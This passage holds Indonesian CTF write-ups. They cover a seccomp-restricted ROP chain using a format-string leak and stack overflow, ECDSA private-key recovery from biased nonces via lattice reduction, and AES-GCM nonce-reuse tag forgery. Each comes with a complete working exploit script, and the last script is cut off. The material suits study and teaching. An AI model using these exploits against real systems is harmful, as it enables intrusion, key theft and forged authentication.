**Pemahaman inti:** Seccomp memblokir `execve` dan bahkan `read(3)`, jadi jalur satu-satunya adalah ORW dengan `pread64`, bukan `open` lalu `read` seperti pola ROP biasa.

---

### 3. Analisis Awal (Recon / Discovery)

Binary `chall` bersifat PIE, Full RELRO, NX, dan memakai canary, dengan libc 2.35. Ada dua permukaan input: `leaker()` memakai `fgets(buf, 0xa0)` lalu `printf(buf)`, yang berarti format string, dan `main()` membaca header 8 byte (size + magic `0xdead`) lalu `read(0, buf@rbp-0x1a0, size)` dengan size dari client, yang berarti stack overflow. Sebelum menyusun ROP, filter seccomp dibaca lebih dulu: whitelist berisi `write`, `open`, `openat`, `pread64`, `close`, `lseek`, `fstat`, `newfstatat`, `brk`, `exit`, dan `exit_group`; `read` hanya diizinkan jika argumen pertama adalah fd 0, sehingga `read(3)` memicu SIGSYS. Pemahaman ini yang menentukan bentuk chain: `openat` untuk membuka `flag.txt`, lalu `pread64(3, buf, 0x100, 0)` untuk membacanya, baru `write` ke stdout.

---

### 4. Eksploitasi / Penyelesaian

#### 8 Nov - SOLVED: NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}

**Binari**: `work/peserta/chall` (PIE, Full RELRO, NX, canary) + libc 2.35 bawaan.
**Vuln**:
1. `leaker()`: `fgets(buf@rbp-0xb0, 0xa0)` lalu `printf(buf)` → **format string** (prompt "nick> ", cetak "halo, " + input).
2. `main()`: `read(0, hdr, 8)`; dword0=size, dword1 harus `0xdead`; lalu `read(0, buf@rbp-0x1a0, size)` dengan **size dari client** → **stack BOF** (canary di rbp-8, RET rbp+8; offset buf→canary = 0x198).
**Seccomp** (whitelist, arg_cnt=0): write(1), open(2), openat(257), pread64(17), close(3), lseek(8), fstat(5), newfstatat(262), brk(12), exit(60), exit_group(231); **read(0) hanya bila arg0==0** (fd0)! `execve` diblokir → jalur ORW; `read(3)` kena SIGSYS (ini yang bikin stage2 awal diam total).
**Leak** (rsp printf = rbp_leaker-0xb0, %6$=buffer[0]):
- `%29$` = RA leaker di main → PIE = v - 0xf1d
- `%28$` = rbp_main; `%83$` = canary main; `%85$` = RA `__libc_start_call_main` → libc base (delta **0x29d90**, call rax @0x29d8e)
**Gadget libc 2.35** (verified objdump): pop rdi=0x2a3e5, pop rsi=0x2be51, pop rax=0x45eb0, pop rdx;pop rbx=0x90469, pop rcx=0x3d1ee, syscall;ret=0x912d6, ret=0x29cd6, `pread64`=0x112880 (wrapper set r10=rcx, syscall 17).
**ROP**: openat(AT_FDCWD,"flag.txt"(vaddr .data 0x3020),0) → **pread64(3, buf, 0x100, 0)** (BUKAN read(3) - diblokir seccomp) → write(1,buf,0x100) → exit_group.
- stage2 = 'A'*0x198 + canary + dummy rbp + chain; hdr = p32(len)+p32(0xdead).
**Bukti**: lokal (ld+libc bawaan + stub libseccomp) → `LOKALFLAG{starved_orw_ok}`; remote 2× dapat
`NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}` (port nxctl saat itu 48319).
**Artefak**: `platform_tools/pwn-7nov/starved_exp.py`, `starved_diag.py`, `starved_dbg.py`.
Catatan: `DECOY{jangan_yang_ini_ya}`, `DECOY{union_gede_kecil_bebas_wkwk}` di binary = umpan.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`platform_tools/pwn-7nov/starved_exp.py`**

````python
#!/usr/bin/env python3
"""Starved - NFX CTF 2026 PWN (Medium).
Vuln: format string di leaker() + stack BOF di main() (read size dari client).
Seccomp: write/read/pread64/openat/close/lseek/fstat/newfstatat/brk/exit
         -> execve diblokir, jalur ORW ke "flag.txt".
Layout main: buf=rbp-0x1a0, canary=rbp-8, savedRBP=rbp, RET=rbp+8
            -> filler 0x1a0 + canary + dummy_rbp + ROP
Leak fmt (rsp printf = rbp_leaker-0xb0, %6$=buffer[0]):
  %29$ = RA leaker di main -> PIE = val - 0xf1d
  %28$ = rbp_main (saved rbp leaker)
  %83$ = canary main
  %85$ = RA __libc_start_call_main (delta=0x29d90 utk libc 2.35 bawaan)
"""
import socket, struct, sys, os, re, time, select, subprocess, json

p32 = lambda x: struct.pack('<I', x & 0xffffffff)
p64 = lambda x: struct.pack('<Q', x & 0xffffffffffffffff)
HERE = os.path.dirname(os.path.abspath(__file__))
BINDIR = 'challenges/pwn/starved/work/peserta'
RA_LEAKER = 0xf1d
FLG_OFF = 0x3020
LEAK_FMT = b'%29$p|%28$p|%83$p|%85$p\n'

class Conn:
    def __init__(self, sock=None, proc=None):
        self.sock, self.proc = sock, proc
        self.buf = b''
    def send(self, data):
        if self.sock: self.sock.sendall(data)
        else:
            self.proc.stdin.write(data); self.proc.stdin.flush()
    def recv(self, timeout=3.0, n=8192):
        if self.sock:
            r,_,_ = select.select([self.sock], [], [], timeout)
            if not r: return b''
            return self.sock.recv(n)
        r,_,_ = select.select([self.proc.stdout], [], [], timeout)
        if not r: return b''
        return os.read(self.proc.stdout.fileno(), n)
    def recv_until(self, marker, timeout=6.0):
        end = time.time() + timeout
        while marker not in self.buf:
            left = end - time.time()
            if left <= 0: break
            d = self.recv(left)
            if not d: break
            self.buf += d
        return self.buf

def parse_leaks(out):
    vals = re.findall(rb'0x[0-9a-f]+', out)
    return [int(v,16) for v in vals]

def find_gadgets(path):
    data = open(path,'rb').read()
    # .text file offset/size via readelf
    txt = subprocess.run(['readelf','-SW',path], capture_output=True, text=True).stdout
    m = re.search(r'\.text\s+PROGBITS\s+([0-9a-f]+)\s+([0-9a-f]+)\s+([0-9a-f]+)', txt)
    off, addr, size = int(m.group(2),16), int(m.group(1),16), int(m.group(3),16)
    lo, hi = off, off+size
    def scan(pat, start=lo):
        i = data.find(pat, start, hi)
        return i if i >= 0 else None
    g = {}
    for name, pat in [('pop_rdi', b'\x5f\xc3'), ('pop_rsi', b'\x5e\xc3'),
                      ('pop_rax', b'\x58\xc3'), ('syscall', b'\x0f\x05\xc3'),
                      ('ret', b'\xc3')]:
        o = scan(pat)
        if o is None: raise SystemExit(f'gadget {name} tidak ada di {path}')
        g[name] = o
    # pop rdx variants + junk slots
    rdx_variants = [(b'\x5a\xc3',0),(b'\x5a\x5b\xc3',1),(b'\x5a\x5d\xc3',1),
                    (b'\x5a\x5e\xc3',1),(b'\x5a\x5f\xc3',1),
                    (b'\x5a\x41\x5c\xc3',1),(b'\x5a\x41\x5d\xc3',1),
                    (b'\x5a\x41\x5e\xc3',1),(b'\x5a\x41\x5f\xc3',1)]
    for pat, junk in rdx_variants:
        o = scan(pat)
        if o is not None:
            g['pop_rdx'] = o; g['rdx_junk'] = junk; break
    else:
        raise SystemExit(f'pop rdx tidak ada di {path}')
    # pop rcx variants (4th arg utk panggil pread64 wrapper)
    rcx_variants = [(b'\x59\xc3',0),(b'\x59\x5b\xc3',1),(b'\x59\x5d\xc3',1),
                    (b'\x59\x41\x5c\xc3',1),(b'\x59\x41\x5d\xc3',1)]
    for pat, junk in rcx_variants:
        o = scan(pat)
        if o is not None:
            g['pop_rcx'] = o; g['rcx_junk'] = junk; break
    else:
        raise SystemExit(f'pop rcx tidak ada di {path}')
    # offset pread64 (wrapper: mov r10,rcx; mov eax,17; syscall; ret)
    nm = subprocess.run(['nm','-D',path], capture_output=True, text=True).stdout
    for line in nm.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2].split('@')[0] == 'pread64':
            g['pread64'] = int(parts[0],16); break
    else:
        raise SystemExit(f'pread64 tidak ada di {path}')
    return g

def build_chain(g, libc_base, pie_base, write_buf):
    L = lambda off: libc_base + off
    def pop_rdx(v):
        return p64(L(g['pop_rdx'])) + p64(v) + b'\x00'*8*g['rdx_junk']
    def pop_rcx(v):
        return p64(L(g['pop_rcx'])) + p64(v) + b'\x00'*8*g['rcx_junk']
    c = p64(L(g['pop_rdi'])) + p64(0xffffffffffffff9c) # AT_FDCWD
    c += p64(L(g['pop_rsi'])) + p64(pie_base + FLG_OFF) # "flag.txt"
    c += pop_rdx(0) # O_RDONLY
    c += p64(L(g['pop_rax'])) + p64(257) # SYS_openat
    c += p64(L(g['syscall']))
    # read fd3 diblokir seccomp (read hanya arg0==0) -> pakai pread64 wrapper
    c += p64(L(g['pop_rdi'])) + p64(3)
    c += p64(L(g['pop_rsi'])) + p64(write_buf)
    c += pop_rdx(0x100)
    c += pop_rcx(0) # offset=0
    c += p64(L(g['ret'])) # align utk call fungsi
    c += p64(L(g['pread64']))
    c += p64(L(g['pop_rdi'])) + p64(1) # stdout
    c += p64(L(g['pop_rsi'])) + p64(write_buf)
    c += pop_rdx(0x100)
    c += p64(L(g['pop_rax'])) + p64(1) # SYS_write
    c += p64(L(g['syscall']))
    c += p64(L(g['pop_rdi'])) + p64(0)
    c += p64(L(g['pop_rax'])) + p64(231) # exit_group
    c += p64(L(g['syscall']))
    return c

def do_leak(c):
    c.recv_until(b'nick> ')
    c.buf = b''
    c.send(LEAK_FMT)
    out = b''
    end = time.time() + 3
    while b'0x' not in out and time.time() < end:
        d = c.recv(0.5)
        if d: out += d
    vals = parse_leaks(out)
    print('[leak raw]', out)
    if len(vals) < 4:
        raise SystemExit(f'LEAK GAGAL: {out!r}')
    pie_ra, rbp_main, canary, libc_ra = vals[-4:]
    return pie_ra, rbp_main, canary, libc_ra

def do_pwn(c, pie_ra, rbp_main, canary, libc_ra, delta, g, write_buf):
    pie_base = pie_ra - RA_LEAKER
    libc_base = libc_ra - delta
    print(f'[calc] pie={pie_base:#x} libc={libc_base:#x} rbp={rbp_main:#x} canary={canary:#x} gadgets={ {k:hex(v) for k,v in g.items()} }')
    chain = build_chain(g, libc_base, pie_base, write_buf)
    stage2 = b'A'*0x198 + p64(canary) + p64(0xdeadbeef) + chain
    hdr = p32(len(stage2)) + p32(0xdead)
    c.send(hdr)
    time.sleep(0.1)
    c.send(stage2)
    out = b''
    end = time.time() + 6
    while time.time() < end:
        d = c.recv(min(2, end-time.time()))
        if not d: break
        out += d
    print('[stage2 out]', out)
    return out

def libc_path_base_from_maps(pid):
    for line in open(f'/proc/{pid}/maps'):
        if 'libc.so.6' in line:
            path = line.split()[-1]
            return path, int(line.split('-')[0], 16)
    return None, None

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    if mode == 'local':
        open(os.path.join(BINDIR, 'flag.txt'), 'w').write('LOKALFLAG{starved_orw_ok}\n')
        proc = subprocess.Popen(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'],
                                cwd=BINDIR, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT)
        c = Conn(proc=proc)
        pie_ra, rbp_main, canary, libc_ra = do_leak(c)
        lpath, base = libc_path_base_from_maps(proc.pid)
        delta = libc_ra - base
        print(f'[local] libc={lpath} base={base:#x} delta={delta:#x}')
        g = find_gadgets(lpath)
        out = do_pwn(c, pie_ra, rbp_main, canary, libc_ra, delta, g, rbp_main-0x1a0)
        print('LOCAL RESULT:', [l for l in out.split(b'\n') if b'{' in l] or out)
        proc.kill()
    else:
        host, port = sys.argv[2], int(sys.argv[3])
        delta = 0x29d90 # libc 2.35 bawaan: RA __libc_start_call_main
        g = find_gadgets(os.path.join(BINDIR, 'libc.so.6'))
        s = socket.create_connection((host, port), timeout=10)
        s.settimeout(5)
        c = Conn(sock=s)
        pie_ra, rbp_main, canary, libc_ra = do_leak(c)
        out = do_pwn(c, pie_ra, rbp_main, canary, libc_ra, delta, g, rbp_main-0x1a0)
        print('REMOTE RESULT:', [l for l in out.split(b'\n') if b'{' in l] or out)

if __name__ == '__main__':
    main()
````


<a id="p1-ecdsa-nonce-bias"></a>
# NFX CTF 2026 - ECDSA Nonce Bias

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Hard
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NXCTF{ecds4_hnp_n0nc3_b14s_8b1t_l4tt1c3_a3d2ae498097}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: rio

Diberikan 200 signature ECDSA pada kurva secp256k1. Nonce yang dipakai tidak acak seragam: 8 bit teratas selalu nol, sehingga `k < 2^248`. Terdapat juga ciphertext flag yang dienkripsi dengan AES-GCM menggunakan key turunan dari private key ECDSA.

Pulihkan private key dan dekripsi flag.

> Format: NXCTF{...}

**Lampiran:**

- `challenge.py` → `crypto/ecdsa-nonce-bias/output.txt` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/ECDSA_Nonce_Bias/challenge.py
- `output.txt` → `crypto/ecdsa-nonce-bias/pubkey.pem` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/ECDSA_Nonce_Bias/output.txt
- `pubkey.pem` → `crypto/ecdsa-nonce-bias/challenge.py` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/ECDSA_Nonce_Bias/pubkey.pem

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `challenge.py` · `output.txt` · `pubkey.pem` · `solve.py`

---

### 2. TL;DR (Ringkasan Singkat)

output.txt berisi kurva secp256k1, 200 signature, dan parameter K_BITS=248 dengan top8_k=0. Artinya setiap nonce k_i selalu lebih kecil dari 2^248, sebuah bias 8 bit yang sistematis. Flag: `NXCTF{ecds4_hnp_n0nc3_b14s_8b1t_l4tt1c3_a3d2ae498097}`.

**Pemahaman inti:** Ini hidden number problem: tiap signature memberi persamaan linear private key modulo n dengan error nonce di bawah 2^248. LLL pada 60 sampel cukup, tanpa perlu brute 2^248.

---

### 3. Analisis Awal (Recon / Discovery)

`output.txt` berisi kurva secp256k1, 200 signature, dan parameter `K_BITS=248` dengan `top8_k=0`. Artinya setiap nonce `k_i` selalu lebih kecil dari `2^248`, sebuah bias 8 bit yang sistematis. Dari persamaan ECDSA `s_i = k_i^-1 (h_i + r_i d) mod n`, tiap signature bisa ditulis sebagai `k_i = r_i s_i^-1 d - h_i s_i^-1 mod n`, yaitu persamaan linear dalam private key `d` dengan error yang dibatasi `B = 2^248`. Selain itu ada ciphertext AES-GCM dengan key turunan `SHA256(d)`, jadi target akhirnya bukan hanya memulihkan `d`, tetapi mendekripsi dan memverifikasi tag. Pemahaman ini mengarahkan solusi ke lattice HNP, bukan ke pencarian nonce satu per satu.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `output.txt`: secp256k1, n = order, 200 signature, `K_BITS=248`, `top8_k=0`
   → k_i < 2^248 (bias 8 bit). Flag cipher: AES-GCM (nonce/ct/tag diberikan).
2. Model HNP: `k_i = r_i·s_i⁻¹·d + (−h_i·s_i⁻¹) mod n`, dengan `0 < k_i < B = 2^248`.
3. Lattice (m+2)×(m+2) (versi integer ekuivalen matriks rasional standar × n):
   baris i<m: n² di diagonal; baris m: `n·t_i` …, entry terakhir `B` (kolom m);
   baris m+1: `n·u_i` …, entry `n·B`; t_i=r_i s_i⁻¹, u_i=−h_i s_i⁻¹.
   Vektor target = n·(k_1..k_m, d·B/n, B).
4. LLL (fpylll) dengan **m=60** sudah cukup: komponen ke-m habis dibagi B →
   `d = 0xe59b58bbc7a872a170ef684d62f92bbbe511f3bd5d9ec50814435c3666e1fffa`,
   diverifikasi ulang: semua k_i < 2^248 .
5. `key = SHA256(d.to_bytes(32,'big'))`, AES-GCM decrypt_and_verify →
   `NXCTF{ecds4_hnp_n0nc3_b14s_8b1t_l4tt1c3_a3d2ae498097}`
6. **Flag**: `NXCTF{ecds4_hnp_n0nc3_b14s_8b1t_l4tt1c3_a3d2ae498097}` (tag GCM verified)

---

### 5. Flag & Verifikasi

**Flag:** `NXCTF{ecds4_hnp_n0nc3_b14s_8b1t_l4tt1c3_a3d2ae498097}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`challenges/crypto/ecdsa-nonce-bias/solve.py`**

````python
#!/usr/bin/env python3
"""ECDSA Nonce Bias - Hidden Number Problem via lattice (fpylll, tanpa Sage).

k_i < 2^248 (8 MSB nol) pada secp256k1.
k_i = r_i*s_i^-1*d + (-h_i*s_i^-1) mod n
Lattice (m+2)x(m+2) versi integer dari matriks rasional standar (semua entry x n):
  baris i<m : n^2 di diagonal
  baris m : n*t_i , ..., B
  baris m+1 : n*u_i , ..., n*B
Vektor target = n*(k_1..k_m, d*B/n, B) -> setelah LLL, komponen ke-m = d*B.
"""
import json, hashlib
from fpylll import IntegerMatrix, LLL

d_ = json.load(open("output.txt"))
n = int(d_["n"], 16)
sigs = [(int(s["r"], 16), int(s["s"], 16), int(s["h"], 16)) for s in d_["signatures"]]
B = 1 << 248
fc = d_["flag_ciphertext"]
nonce = bytes.fromhex(fc["nonce_hex"])
ct = bytes.fromhex(fc["ct_hex"])
tag = bytes.fromhex(fc["tag_hex"])


def check(d):
    if not (0 < d < n):
        return False
    ks = []
    for r, s, h in sigs:
        k = ((h + r * d) * pow(s, -1, n)) % n
        if k == 0 or k >= B:
            return False
        ks.append(k)
    return True


def attack(m):
    t = [(r * pow(s, -1, n)) % n for r, s, h in sigs[:m]]
    u = [(-h * pow(s, -1, n)) % n for r, s, h in sigs[:m]]
    M = IntegerMatrix(m + 2, m + 2)
    for i in range(m):
        M[i, i] = n * n
    for i in range(m):
        M[m, i] = n * t[i]
        M[m + 1, i] = n * u[i]
    M[m, m] = B
    M[m + 1, m + 1] = n * B
    LLL.reduction(M)
    for i in range(m + 2):
        val = int(M[i, m])
        for cand in (val, -val):
            if cand % B == 0:
                dd = (cand // B) % n
                for c in (dd, (-dd) % n):
                    if check(c):
                        return c
    return None


for m in (60, 80, 120, 200):
    print("coba m =", m, flush=True)
    d = attack(m)
    if d:
        print("d ketemu:", hex(d))
        key = hashlib.sha256(d.to_bytes(32, "big")).digest()
        from Crypto.Cipher import AES
        pt = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
        print("FLAG:", pt)
        break
else:
    print("gagal")
````


<a id="p1-flagkeepers"></a>
# NFX CTF 2026 - FlagKeepers

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Hard
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{gcm_f0rb1dd3n_4tt4ck_du4l_t4g_c0ll1s10n_m4st3r}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![img](https://giffiles.alphacoders.com/147/147600.gif)

**FlagKeepers** adalah layanan audit dan pemulihan terenkripsi yang dibangun di atas enkripsi terautentikasi AES-GCM. Layanan ini mempertahankan dua konteks enkripsi independen - **kunci utama** untuk log audit dan **kunci cadangan** untuk pemulihan bencana - yang berbagi satu nonce sesi.

Bisakah Anda mengeksploitasi penggunaan kembali nonce, mengeksploitasi struktur polinomial GHASH di atas GF(2^128), dan memalsukan payload valid ganda untuk mengekstrak flag utama?

**Lampiran:**

- `app.py` → `crypto/flagkeepers/app.py` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/FlagKeepers/app.py

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `app.py` · `solve.py`

---

### 2. TL;DR (Ringkasan Singkat)

app.py mempertahankan dua konteks enkripsi: key_a untuk log audit dan key_b untuk recovery, tetapi keduanya memakai satu nonce global. Opsi 2 (recovery) mencetak plaintext log, ciphertext, dan tag dengan nonce yang sama, sedangkan opsi 4 (flag) membutuhkan payload yang didekripsi dengan key_b berisi admin = True di msg[:idx] tanpa admin = False. Flag: `NFX{gcm_f0rb1dd3n_4tt4ck_du4l_t4g_c0ll1s10n_m4st3r}`.

**Pemahaman inti:** Nonce yang sama dipakai dua key berbeda, dan GHASH adalah polinomial H dengan koefisien ciphertext. Selisih dua sampel memberi polinomial yang berakar di H, jadi GCD dua polinomial memulihkan H tanpa brute.

---

### 3. Analisis Awal (Recon / Discovery)

`app.py` mempertahankan dua konteks enkripsi: `key_a` untuk log audit dan `key_b` untuk recovery, tetapi keduanya memakai satu nonce global. Opsi 2 (recovery) mencetak plaintext log, ciphertext, dan tag dengan nonce yang sama, sedangkan opsi 4 (flag) membutuhkan payload yang didekripsi dengan `key_b` berisi `admin = True` di `msg[:idx]` tanpa `admin = False`. Model GCM-nya penting dipahami: `tag = GHASH_H(C) xor S`, dan `GHASH_H(C)` adalah polinomial dalam H yang koefisiennya berasal dari blok ciphertext. Karena nonce sama, `S = E_K(J0)` juga sama untuk semua sampel dengan key yang sama, sehingga selisih dua tag menghilangkan S dan menyisakan polinomial derajat 5 yang berakar di H. Dua polinomial seperti itu cukup untuk memulihkan H lewat GCD, lalu S bisa dihitung ulang dan tag baru bisa dipalsukan.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `app.py`: `key_a`/`key_b` acak, **satu nonce global** untuk keduanya. Opsi 2
   (recovery, key_b) mencetak plaintext log + CT + Tag; opsi 4 (flag, key_b)
   butuh payload decrypt key_b berisi `"admin = True"` di `msg[:idx]` dan tanpa
   `"admin = False"`. `idx` naik 16 tiap opsi 1, turun 16 tiap opsi 2.
2. Ambil 4 sampel opsi 2 (plaintext diketahui, nonce sama) → tiap pasangan memberi
   persamaan polinomial GHASH atas GF(2^128): `R(H)=Poly_i(H)^Poly_0(H)^T_i^T_0=0`,
   derajat 5 (4 blok CT + blok panjang).
3. `gcd(R_1,R_2)` = `x + H_b` → **H key_b** pulih; `S = T ^ GHASH_H(C)`.
   (Catatan implementasi: GCM pakai representasi bit MSB-first dengan
   R=0xe1<<120 dan identitas `1<<127` - bukan polinom LSB-first.)
4. Forge: `ct' = pt' ^ KS` (KS dari sampel pertama), `tag' = GHASH_H(ct') ^ S`,
   `pt' = b"admin = True" + "A"*39` (51 byte, sama panjang sampel).
5. `idx`: 4× opsi2 → 192, lalu 3× opsi1 → 240 (`msg[:240]` = seluruh msg).
6. Kirim opsi 4 → service: `NFX{gcm_f0rb1dd3n_4tt4ck_du4l_t4g_c0ll1s10n_m4st3r}`
7. **Verifikasi**: exploit lokal (`solve.py --test`) memakai pycryptodome membuktikan
   H recovery + forge `decrypt_and_verify` sukses 3/3; attack live sukses (flag dicetak).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{gcm_f0rb1dd3n_4tt4ck_du4l_t4g_c0ll1s10n_m4st3r}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`challenges/crypto/flagkeepers/solve.py`**

````python
#!/usr/bin/env python3
"""FlagKeepers - GCM nonce reuse (2 key berbeda, nonce sama) -> pulihkan H key_b,
lalu forge ct/tag berisi "admin = True", kirim ke opsi [4] (decrypt key_b).

GHASH: T = GHASH_H(C) ^ S, S = E_K(J0). GHASH_H(C) adalah polinomial H dengan
koefisien = blok ciphertext (linear di C, derajat = jumlah blok).
Dua sampel (nonce sama, key sama, plaintext diketahui):
  R_i(H) = Poly_i(H) ^ Poly_0(H) ^ T_i ^ T_0 = 0
gcd(R_1, R_2) = (H + H_true) -> H. Lalu S = T ^ GHASH_H(C).
Forge: ct' = pt' ^ KS (KS dari sampel), tag' = GHASH_H(ct') ^ S.
"""
import sys
import socket
import re

# ---------- GF(2^128) ----------
def gf_mul(a, b):
    """Perkalian GCM (bit MSB-first, reduksi R = 0xe1<<120)."""
    R = 0xE1 << 120
    z = 0
    v = b
    for i in range(128):
        if (a >> (127 - i)) & 1:
            z ^= v
        if v & 1:
            v = (v >> 1) ^ R
        else:
            v >>= 1
    return z


def gf_pow(a, e):
    r = 1 << 127 # identitas perkalian GCM (MSB-first)
    while e:
        if e & 1:
            r = gf_mul(r, a)
        a = gf_mul(a, a)
        e >>= 1
    return r


def gf_inv(a):
    return gf_pow(a, (1 << 128) - 2)


# ---------- polinomial atas GF(2^128), coeff[0] = konstanta ----------
def poly_trim(p):
    while len(p) > 1 and p[-1] == 0:
        p.pop()
    if not p:
        p.append(0)
    return p


def poly_divmod(a, b):
    a = a[:]
    poly_trim(a)
    b = b[:]
    poly_trim(b)
    db = len(b) - 1
    inv_lb = gf_inv(b[-1])
    q = [0] * max(1, len(a) - db)
    while len(a) - 1 >= db and any(a):
        shift = len(a) - 1 - db
        coef = gf_mul(a[-1], inv_lb)
        q[shift] = coef
        for i in range(len(b)):
            a[i + shift] ^= gf_mul(coef, b[i])
        a.pop()
    if not a:
        a = [0]
    return q, a


def poly_gcd(a, b):
    a = a[:]
    b = b[:]
    poly_trim(a)
    poly_trim(b)
    while not (len(b) == 1 and b[0] == 0):
        _, r = poly_divmod(a, b)
        a, b = b, r
        poly_trim(b)
    # monic
    if len(a) > 1 and a[-1] != 1:
        inv = gf_inv(a[-1])
        a = [gf_mul(c, inv) for c in a]
    return a


# ---------- GHASH ----------
def ghash_poly(ct):
    blocks = [ct[i:i + 16].ljust(16, b"\x00") for i in range(0, len(ct), 16)]
    L = (0 << 64) | (len(ct) * 8)
    poly = [0]
    for b in blocks:
        poly[0] ^= int.from_bytes(b, "big") # X ^= B
        poly = [0] + poly # X *= H
    poly[0] ^= L
    poly = [0] + poly
    return poly


def ghash_eval(poly, H):
    r = 0
    for k in range(len(poly) - 1, -1, -1):
        r = gf_mul(r, H) ^ poly[k]
    return r


def recover_H(pairs):
    """pairs: list of (ct, tag). H dari gcd dua polinomial selisih."""
    polys = []
    for i in range(1, len(pairs)):
        ct0, t0 = pairs[0]
        cti, ti = pairs[i]
        p0 = ghash_poly(ct0)
        pi = ghash_poly(cti)
        n = max(len(p0), len(pi))
        p0 = p0 + [0] * (n - len(p0))
        pi = pi + [0] * (n - len(pi))
        R = [p0[k] ^ pi[k] for k in range(n)]
        R[0] ^= t0 ^ ti
        polys.append((poly_trim(R[:]), (cti, ti)))
    cands = []
    for i in range(len(polys)):
        for j in range(i + 1, len(polys)):
            g = poly_gcd(polys[i][0], polys[j][0])
            if len(g) == 2:
                cands.append(g[0]) # monic g = x + c -> root H = c
    out = []
    for H in cands:
        S = None
        ok = True
        for ct, tag in pairs:
            s = ghash_eval(ghash_poly(ct), H) ^ tag
            if S is None:
                S = s
            elif s != S:
                ok = False
                break
        if ok:
            out.append((H, S))
    return out


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        from Crypto.Cipher import AES
        import os
        for trial in range(3):
            key = os.urandom(16)
            nonce = os.urandom(12)
            pairs = []
            for i in range(4):
                msg = (f"RECOVERY|ts={1750000000+i}|r={os.urandom(4).hex()}|t={os.urandom(6).hex()}|OK").encode()
                c = AES.new(key, AES.MODE_GCM, nonce=nonce)
                ct, tag = c.encrypt_and_digest(msg)
                pairs.append((ct, int.from_bytes(tag, "big"), msg))
            res = recover_H([(ct, t) for ct, t, _ in pairs])
            assert res, "recover gagal"
            H, S = res[0]
            H_true = int.from_bytes(AES.new(key, AES.MODE_ECB).encrypt(b"\x00" * 16), "big")
            assert H == H_true, "H salah"
            # forge
            ks = bytes(a ^ b for a, b in zip(pairs[0][0], pairs[0][2]))
            msg = b"admin = True" + b"A" * (len(pairs[0][0]) - 12)
            ct = bytes(a ^ b for a, b in zip(msg, ks))
            tag = ghash_eval(ghash_poly(ct), H) ^ S
            from Crypto.Util.strxor import strxor
            d = AES.new(key, AES.MODE_GCM, nonce=nonce)
            pt = d.decrypt_and_verify(ct, tag.to_bytes(16, "big"))
            assert pt == msg
            print(f"test {trial} OK")
        return

    import urllib.request, json as _json
    HOST = "s1.nfx.my.id"
    PORT = 0
    try:
        req = urllib.request.Request(
            "https://ctf.nfx.my.id/api/nxctl?action=status",
            headers={"X-NXCTL-Challenge-Key": "NFXCTF-NFCC-NXCTF-2026"})
        st = _json.load(urllib.request.urlopen(req, timeout=20))
        for c in st:
            if c.get("name") == "NFX/FlagKeepers":
                for ex in c.get("exports", []):
                    if ex.get("port"):
                        PORT = ex["port"]
    except Exception as e:
        print("gagal query nxctl:", e)
    if not PORT:
        PORT = 45379
    print("connect", HOST, PORT)
    s = socket.create_connection((HOST, PORT), timeout=15)

    def read_until(marker):
        s.settimeout(10)
        buf = b""
        while marker not in buf:
            try:
                c = s.recv(65536)
            except socket.timeout:
                break
            if not c:
                break
            buf += c
        return buf

    buf = read_until(b"> ")
    pairs = []
    for _ in range(4):
        s.sendall(b"2\n")
        resp = read_until(b"> ")
        txt = resp.decode(errors="replace")
        m_nonce = re.search(r"Nonce: ([0-9a-f]+)", txt)
        m_log = re.search(r"Log \[(.*?)\]", txt)
        m_ct = re.search(r"CT: ([0-9a-f]+)", txt)
        m_tag = re.search(r"Tag: ([0-9a-f]+)", txt)
        ct = bytes.fromhex(m_ct.group(1))
        tag = int(m_tag.group(1), 16)
        pt = m_log.group(1).encode()
        assert len(pt) == len(ct)
        pairs.append((ct, tag, pt))
        print("sample len", len(ct), "log:", m_log.group(1))
    # naikkan idx: opsi 1 menambah 16; idx sekarang (0 - 4*16) mod 256 = 192
    for _ in range(3):
        s.sendall(b"1\n")
        read_until(b"> ")
    res = recover_H([(ct, t) for ct, t, _ in pairs])
    if not res:
        print("GAGAL pulihkan H")
        return
    H, S = res[0]
    print("H dan S pulih")
    ks = bytes(a ^ b for a, b in zip(pairs[0][0], pairs[0][2]))
    msg = b"admin = True" + b"A" * (len(ks) - 12)
    assert b"admin = False" not in msg
    ct = bytes(a ^ b for a, b in zip(msg, ks))
    tag = ghash_eval(ghash_poly(ct), H) ^ S
    print("kirim forged payload -> opsi 4")
    s.sendall(b"4\n")
    read_until(b"CT: ")
    s.sendall(ct.hex().encode() + b"\n")
